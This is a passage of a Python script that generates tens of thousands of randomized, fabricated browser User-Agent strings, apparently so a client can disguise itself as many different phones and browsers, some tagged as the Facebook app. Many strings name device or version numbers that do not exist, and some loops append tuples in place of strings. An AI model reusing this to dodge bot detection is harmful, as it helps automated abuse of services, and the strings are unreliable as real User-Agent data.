Chrome/91.0.4532.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-W392P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4826.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-D526R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4850.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-S941P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4525.140 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-E612I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4848.63 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 16;  en-us; GT-B328G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4213.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-U686Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4605.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-G407H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4432.138 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-W769M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4682.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-C518R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4325.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-E978W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4528.78 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-L406Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4535.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-D26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4315.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-W599V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4277.57 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-A282O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4614.129 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-C763G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4501.103 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-P278T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4809.132 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-W992L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4272.56 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-D371N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4740.77 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-S911X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4390.112 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-V566R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4836.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-O298L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4712.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-T491S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4701.65 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-J236Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4580.54 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-W486G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4350.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-Y511L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4648.137 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-D566Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4306.124 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-Q495R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4388.43 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-J986V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4535.61 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-I164A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4821.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-B952I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4200.108 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-J958Y) AppleWebKit/537.36']
for i in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    voda = random.choice([u1, u2, u3, u4, u5])
    ugen.append(voda)
for ggytggd in range(10000):
    x1="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5615.199 Safari/537.36",
    x2="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5; rv:121.0esr) Gecko/20000101 Firefox/121.0esr",
    x3="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5664.210 Safari/537.36",
    x4="Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.195 Safari/537.36 Edg/113.0.1672.58",
    x5="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5621.225 Safari/537.36",
    x6="Mozilla/5.0 (Android 9.2; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    x7="Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/627.7 (KHTML, like Gecko) Version/11.3 Mobile/62UYEW Safari/627.7",
    x8="Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5666.206 Safari/537.36",
    x9="Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/600.5.22 (KHTML, like Gecko) Version/14.6.25 Mobile/FP2ZBT Safari/630.7",
    x10="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20010101 Firefox/118.0/YYRH9jNan3-49",
    x11="Mozilla/5.0 (Android; Mobile; rv:114.0esr) Gecko/114.0esr Firefox/114.0esr",
    x12="Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20102901 Firefox/115.0",
    x13="Mozilla/5.0 (Linux; Android 11; MRX-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5656.198 Mobile Safari/537.36",
    x14="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5661.219 Safari/537.36",
    x15="Mozilla/5.0 (Android 10; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    x16="Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20100911 Firefox/112.0",
    x17="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5628.220 Safari/537.36 Edg/111.0.1704.37",
    x18="Mozilla/5.0 (Android 9.3; Tablet; rv:118.0) Gecko/118.0 Firefox/118.0",
    x19="Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/626.36.14 (KHTML, like Gecko) Version/11.2.31 Mobile/25N8NJ Safari/626.36.14",
    x20="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.201 Safari/537.36",
    ff=(x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20)
    ugen.append(ff)
for ggytggd in range(10000):
    x1="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5630.196 Safari/537.36",
    x2="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5641.198 Safari/537.36",
    x3="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5631.209 Safari/537.36",
    x4="Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/615.22 (KHTML, like Gecko) Version/11.2.41 Mobile/94CPLG Safari/615.22",
    x5="Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/617.34 (KHTML, like Gecko) Version/10.4 Mobile/F8LQRA Safari/617.34",
    x6="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.198 Safari/537.36",
    x7="Mozilla/5.0 (Linux; Android 9; SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5626.223 Mobile Safari/537.36",
    x8="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5621.203 Safari/537.36",
    x9="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5651.200 Safari/537.36",
    x10="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5634.219 Safari/537.36 OPR/96.0.3512.153",
    x11="Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.210 Safari/537.36",
    x12="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5652.205 Safari/537.36",
    x13="Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5650.226 Safari/537.36 Edg/112.0.1710.61",
    x14="Mozilla/5.0 (X11; U; Linux x86_64; rv:120.0) Gecko/20102109 Firefox/120.0",
    x15="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5659.204 Safari/537.36 Edg/111.0.1720.56",
    x16="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5647.213 Safari/537.36",
    x17="Mozilla/5.0 (X11; Linux x86_64; en-US) Gecko/20070614 Firefox/111.0",
    x18="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.215 Safari/537.36 Edg/112.0.1683.36",
    x19="Mozilla/5.0 (Android 10.4; Tablet; rv:121.0) Gecko/121.0 Firefox/121.0",
    x20="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.210 Safari/537.36",
    x21="Mozilla/5.0 (Android 9.2; Mobile; rv:115.0esr) Gecko/115.0esr Firefox/115.0esrMozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5670.211 Safari/537.36",
    x22="Mozilla/5.0 (Windows NT 10.0; Win64; rv:117.0) Gecko/20010101 Firefox/117.0",
    x23="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.219 Safari/537.36",
    x24="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5619.222 Safari/537.36",
    x25="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0/O03JPftRwK6db",
    x26="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5648.207 Safari/537.36 OPR/96.0.4323.135",
    x27="Mozilla/5.0 (Linux; Android 10; SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5646.224 Mobile Safari/537.36",
    x28="Mozilla/5.0 (Linux; Android 9; SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5642.219 Mobile Safari/537.36",
    x29="Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:118.0) Gecko/20162211 Firefox/118.0",
    x30="Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5644.203 Safari/537.36",
    x31="Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5666.221 Safari/537.36",
    x32="Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/113.0.5624.224 Chrome/113.0.5624.224 Safari/537.36",
    x33="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5636.197 Safari/537.36",
    x34="Mozilla/5.0 (Linux; Android 10; SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5639.198 Mobile Safari/537.36",
    x35="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5639.211 Safari/537.36",
    ff=(x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20,x21,x22,x23,x24,x25,x26,x27,x28,x29,x30,x31,x32,x33,x34,x35)
    ugen.append(ff)
for ggyggd in range(100000):
    x1="Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    ff=(x1)
    ugen.append(ff)
for txt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/353.0.0.5.112;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txxxtt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txrelmet in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX3081 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txret in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX2156 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.7.110;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txoppt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='CPH1969 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,250)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
nka = ["NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1","NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0","nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",]
for xccd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for xxdtf in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xtd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
for xz in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for xdx in range(3000):
	build_nokiax = ['JDQ39','JZO54K']
	rr = random.randint; rc = random.choice
	miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
	miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
	miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302',